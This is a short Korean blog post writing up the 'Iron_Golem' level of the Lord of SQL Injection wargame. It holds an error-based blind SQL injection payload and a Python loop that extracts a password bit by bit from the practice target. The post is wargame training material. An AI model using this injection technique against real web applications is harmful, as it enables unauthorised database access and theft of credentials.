---
layout: post
title: LOS Iron_Golem
date: 2015-08-16 23:08:00 +0900
category: Hacking 
---
```
http://leaveret.kr/los/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=%27or%20if(substr(lpad(bin(ord(substr(pw,"+str(j)+",1))),16,%270%27),"+str(i)+",1)=1,(select%201%20union%20select%202),0)%23
```



SubQuery를 이용해 해결하는 문제 기억이 맞다면 키값때문에 굉장히 빡쳤다.

키값이 한글임 아오 



중간에 str(j)랑 str(i)를 바꿔서 공격

http://mwultong.blogspot.com/2008/02/16-2-10-8-hex-calc.html







```
for j in range(1,23):

        for i in reversed(range(1,17)):

                site="http://los.sandbox.cash/chall/iron_golem_0803cf46da7bda62b328dbfc1d77fe15.php?pw="

                site+="%27or%20if(substr(lpad(bin(ord(substr(pw,"+str(j)+",1))),16,%270%27),"+str(i)+",1)=1,(select%201%20union%20select%202),0)%23"

                print (site)

                r=requests.put(site,headers=header)



                if "Subquery returns more than 1 row" in r.text:

                  q+=w

                w=w*2

        key=key+"   "+str(q)

        print ("\nkey"+key+"\n")

        q=0

        w=1
```










